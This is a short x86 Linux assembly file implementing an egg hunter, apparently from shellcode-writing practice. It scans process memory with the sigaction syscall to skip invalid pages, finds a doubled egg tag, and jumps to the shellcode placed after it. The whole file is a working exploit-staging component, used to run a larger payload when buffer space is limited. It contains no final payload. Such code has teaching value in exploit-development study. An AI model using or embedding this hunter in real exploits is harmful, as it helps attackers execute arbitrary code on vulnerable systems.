global _start

_start:

page_align:
    or cx,0xfff         ; page alignment using bitwise OR this is required
			; if an invalud memory region is encountered

next_address:
    inc ecx		; Increment ECX to the next valid address
    push 0x43		; sigaction(2) System Call
    pop eax             ; sigation poped to EAX
    int 0x80            ; Calling the Interrupt
    cmp al,0xf2         ; EFAULT? Zero Flag gets set
    jz page_align	; If there is an EFAULT, Goto page_allign
       
    mov eax, 0x50905090 ; Else Move the EGG TAG to EAX
    mov edi, ecx        ; Move the Valid address in ECX to EDI
    scasd               ; Compare EAX with EDI and increment EDI by 4 if DF is Unset (4: DWORD, 2:WORD 1:Byte)
    jnz next_address    ; Jump if ZF not set due to scasd
    scasd               ; Compare EAX with EDI and increment EDI by 4 if DF is Unset (4: DWORD, 2:WORD 1:Byte)
    jnz next_address    ; Jump if ZF not set due to scasd
    jmp edi		; Jump to the Shellcode
